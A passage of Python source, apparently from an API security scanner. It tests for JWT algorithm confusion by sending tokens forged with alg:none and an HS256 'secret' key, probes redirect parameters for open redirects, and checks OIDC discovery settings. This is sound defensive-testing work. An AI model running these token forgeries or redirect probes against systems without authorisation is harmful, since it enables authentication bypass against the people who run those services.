        """JWT: probe alg:none and HS256-with-weak-secret against an auth-gated endpoint."""
        token = self.auth_token
        if not token:
            return
        parts = token.split(".")
        if len(parts) != 3:
            return

        try:
            json.loads(_b64url_decode(parts[1]))
        except Exception:
            return  # not a valid JWT payload

        payload_b64 = parts[1]
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        probe_url = base_url
        for path in _JWT_PROBE_PATHS:
            r, _ = self._send("GET", origin + path)
            if r and r.status_code == 200:
                probe_url = origin + path
                break

        none_header = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        none_token = f"{none_header}.{payload_b64}."

        hs_header = _b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        hs_msg = f"{hs_header}.{payload_b64}".encode()
        hs_sig = hmac.new(b"secret", hs_msg, "sha256").digest()
        hs_token = f"{hs_header}.{payload_b64}.{_b64url_encode(hs_sig)}"

        for label, forged in [("alg:none", none_token), ("HS256-secret", hs_token)]:
            if self.stop_event.is_set():
                break
            resp, elapsed = self._send(
                "GET", probe_url,
                headers={self.auth_header: f"Bearer {forged}"},
            )
            if resp is None:
                continue
            body_lower = resp.text.lower()
            rejected = resp.status_code in (401, 403) or any(s in body_lower for s in _JWT_ERROR_SIGNALS)
            if resp.status_code == 200 and not rejected:
                self._make_finding(
                    url=probe_url, method="GET",
                    test_type="jwt_alg_confusion",
                    param="Authorization",
                    finding=(
                        f"JWT algorithm confusion ({label}) — server accepted forged token; "
                        f"authentication can be bypassed without the signing key"
                    ),
                    severity="critical",
                    proof=f"status={resp.status_code} | forged_prefix={forged[:60]} | body[:200]={resp.text[:200]}",
                    payload=forged[:80],
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )

    # ── API10: Open redirect ───────────────────────────────────────────────────

    def _test_open_redirect(self, surface: InputSurface) -> None:
        """API10: Test redirect/url/next/return params for open redirect."""
        url = surface.url
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        redirect_params = [k for k in qs if k.lower() in _REDIRECT_PARAMS]
        if not redirect_params:
            return

        for param in redirect_params:
            if self.stop_event.is_set():
                break
            new_qs = {k: v for k, v in qs.items()}
            new_qs[param] = [_OPEN_REDIRECT_PAYLOAD]
            probe_url = urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))

            resp, elapsed = self._send(surface.method, probe_url)
            if resp is None:
                continue

            location = resp.headers.get("Location", "")
            if _OPEN_REDIRECT_DOMAIN in location:
                self._make_finding(
                    url=url, method=surface.method,
                    test_type="open_redirect",
                    param=param,
                    finding=f"Open redirect: {param} redirects to attacker domain via Location header",
                    severity="medium",
                    proof=f"status={resp.status_code} | Location: {location}",
                    payload=f"{param}={_OPEN_REDIRECT_PAYLOAD}",
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )
                continue

            if resp.status_code == 200:
                body = resp.text
                meta_match = _META_REFRESH_RE.search(body)
                js_match = _JS_REDIRECT_RE.search(body)
                if (
                    (meta_match and _OPEN_REDIRECT_DOMAIN in meta_match.group(1))
                    or (js_match and _OPEN_REDIRECT_DOMAIN in js_match.group(1))
                ):
                    self._make_finding(
                        url=url, method=surface.method,
                        test_type="open_redirect",
                        param=param,
                        finding=f"Open redirect: {param} reflects attacker domain in meta-refresh or JS redirect",
                        severity="medium",
                        proof=f"status={resp.status_code} | body[:300]={body[:300]}",
                        payload=f"{param}={_OPEN_REDIRECT_PAYLOAD}",
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )

    # ── OIDC discovery misconfiguration ───────────────────────────────────────

    def _test_oidc_discovery(self, base_url: str) -> None:
        """OIDC: probe .well-known endpoints for dangerous grant/flow configurations."""
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        for path in _OIDC_DISCOVERY_PATHS:
            if self.stop_event.is_set():
                break
            resp, elapsed = self._send("GET", origin + path)
            if resp is None or resp.status_code != 200:
                continue
            try:
                config = resp.json()
            except Exception:
                continue

            endpoint_url = origin + path

            auth_methods = config.get("token_endpoint_auth_methods_supported", [])
            response_types = config.get("response_types_supported", [])
            grant_types = config.get("grant_types_supported", [])

            oidc_checks = [
                (
                    "token_endpoint_auth_methods_supported",
                    "none" in auth_methods,
                    "OIDC: token_endpoint_auth_methods_supported includes 'none' — "
                    "unauthenticated token exchange permitted (no client secret required)",
                    f"token_endpoint_auth_methods_supported={auth_methods}",
                    "none",
                ),
                (
                    "response_types_supported",
                    any("token" in rt and "code" not in rt for rt in response_types),
                    "OIDC: implicit flow enabled (response_type=token) — "
                    "access tokens exposed in URL fragments, visible in browser history and Referer headers",
                    f"response_types_supported={response_types}",
                    "response_type=token",
                ),
                (
                    "grant_types_supported",
                    "password" in grant_types,
                    "OIDC: Resource Owner Password Credentials (ROPC) grant enabled — "
                    "deprecated; credentials sent directly to the authorization server",
                    f"grant_types_supported={grant_types}",
                    "grant_type=password",
                ),
            ]

            for param, triggered, finding_msg, proof_str, payload_str in oidc_checks:
                if triggered:
                    self._make_finding(
                        url=endpoint_url, method="GET",
                        test_type="oidc_misconfiguration",
                        param=param,
                        finding=finding_msg,
                        severity="medium",
                        proof=proof_str,
                        payload=payload_str,
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )

            break
